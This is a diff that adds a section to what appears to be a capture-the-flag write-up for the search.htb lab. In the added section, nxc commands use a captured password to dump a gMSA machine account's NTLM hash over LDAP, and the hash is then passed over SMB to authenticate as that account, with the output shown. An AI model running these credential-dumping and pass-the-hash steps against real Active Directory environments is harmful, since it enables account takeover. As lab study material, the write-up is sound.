@@ -462,5 +462,18 @@ I have ReadGMSAPassword on the `BIR-ADFS-GMSA$` machine account
 # Compromising `BIR-ADFS-GMSA$`
 
 ```python
-
+nxc ldap research.search.htb -u sierra.frye -p '$$49=wide=STRAIGHT=jordan=28$$18' --gmsa
+LDAP        10.129.229.57   389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.229.57   389    RESEARCH         [+] search.htb\sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18 
+LDAP        10.129.229.57   389    RESEARCH         [*] Getting GMSA Passwords
+LDAP        10.129.229.57   389    RESEARCH         Account: BIR-ADFS-GMSA$       NTLM: e1e9fd9e46d0d747e1595167eedcec0f     PrincipalsAllowedToReadPassword: ITSec
 ```
+Ill use nxc to dump the NLMT of the machine account
+
+```python
+nxc smb research.search.htb -u 'BIR-ADFS-GMSA$' -H 'e1e9fd9e46d0d747e1595167eedcec0f'   
+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\BIR-ADFS-GMSA$:e1e9fd9e46d0d747e1595167eedcec0f
+```
+This machine account is compromised!
+
